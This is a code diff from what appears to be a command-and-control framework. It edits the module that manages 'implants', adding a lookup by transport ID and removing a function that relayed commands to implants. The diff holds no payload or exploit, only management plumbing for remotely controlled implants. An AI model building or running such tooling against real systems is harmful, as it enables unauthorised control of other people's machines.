@@ -12,6 +12,16 @@ def _get_implant_index(listener, implant_id):
         pass
 
 
+def _get_implant_index_from_transport_id(listener, transport_id):
+    try:
+        implant_index = next(index for (index, implant) in enumerate(listener.implants) if implant['transport_id'] == transport_id)
+        return implant_index
+    except StopIteration:
+        listener.logging.log(f"{transport_id} not found!, attempted search for transport frame",
+                             level="error", source="lib.implants")
+        pass
+
+
 def import_transport(listener, transport_name, transport_config):
     import_string = f"import transports.{transport_name} as transport"
     transport_config['logging'] = listener.logging
@@ -64,17 +74,6 @@ def prep_transport_for_implant_manifest(listener, transport_name, transport_conf
                              level="error", source="lib.implants")
 
 
-def relay_cmd_to_implant(listener, implant_id, cmd):
-    # TODO: Cook the command
-    try:
-        implant_index = _get_implant_index(listener, implant_id)
-        if implant_index:
-            listener.implants[implant_index]['transport_handle'].send_data(cmd)
-    except Exception as e:
-        listener.logging.log(f"Critical [{type(e).__name__}] when relaying command to implant {implant_id}: {e}",
-                             level="critical", source=f"lib.implants")
-
-
 def retrieve_output_from_implant(listener, implant_id):
     # TODO: uncook data
     try:
@@ -99,6 +98,7 @@ def initialize_implant(frame, listener):
     data = {'component_id': listener.component_id, "cmd": "ipi",
             "args": [{'lpk': implant_manifest['lpk']}], "txid": frame['txid']}
     instruction_frame = instructions.create_instruction_frame(data)
+    # TODO: Cook the reply_frame
     reply_frame = instruction_frame
     return reply_frame
 
